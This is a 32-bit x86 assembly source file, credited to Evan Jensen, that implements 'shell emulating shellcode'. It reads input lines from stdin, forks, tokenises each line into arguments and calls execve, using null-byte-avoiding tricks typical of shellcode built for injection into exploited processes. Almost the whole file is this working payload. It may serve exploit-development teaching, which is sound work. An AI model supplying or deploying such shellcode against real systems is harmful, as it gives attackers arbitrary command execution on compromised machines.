	;; Evan Jensen 32bit shell emulating shellcode
	;; 

	%include "short32.s"
	%include "syscall.s"
	%define BUFFERLEN 0x1ff

	global main

main:	
	cld
get_input:
	xor eax,eax
	cdq
	mov dx,BUFFERLEN
	sub esp,edx
	mov ecx,esp
	xor ebx,ebx
	push byte read
	pop eax
	SYSTEM_CALL
	mov ebp,eax
	test eax,eax
	jz do_exit ;synchronous IO or GTFO
	mov byte [eax+esp-1],0
	push eax
	
	
do_fork:
	
	push byte fork
	pop eax
	SYSTEM_CALL
	test eax,eax
	jz child
parent:
	push waitpid
	pop eax
	xor ebx,ebx
	mov ecx,ebx
	mov edx,ebx
	SYSTEM_CALL
	jmp get_input
	
child:
	;; let's parse the arguments here
	pop ecx			;return of read pushed by get_input
	push byte " "		
	pop eax			;space used for inlined strchr
	mov ebx,esp
	xor edx,edx
	add esp,BUFFERLEN
add_token: 	;; calculate the pointerp to push
	
	mov esi,ebp
	sub esi,ecx
 	
	lea edi,[ebx + esi] ;register subtraction no good in lea
	mov [esp+edx*4], edi ;save the current token
	inc edx
	
	
	repne scasb
	
	mov esi,ebp
	sub esi,ecx
	mov byte[ebx+esi-1],0
	
	test ecx,ecx
	jz exec
	
	jmp short add_token
	
exec:
	
	
	xor eax,eax
	mov [esp+edx*4],eax
	cdq
	push eax
	mov al,11
	lea ecx,[esp+4]
	
	xor edx,edx
	
	SYSTEM_CALL
	
do_exit:;; exit nicely if anything fails
	push byte exit
	pop eax
	xor ebx,ebx ;optional
	SYSTEM_CALL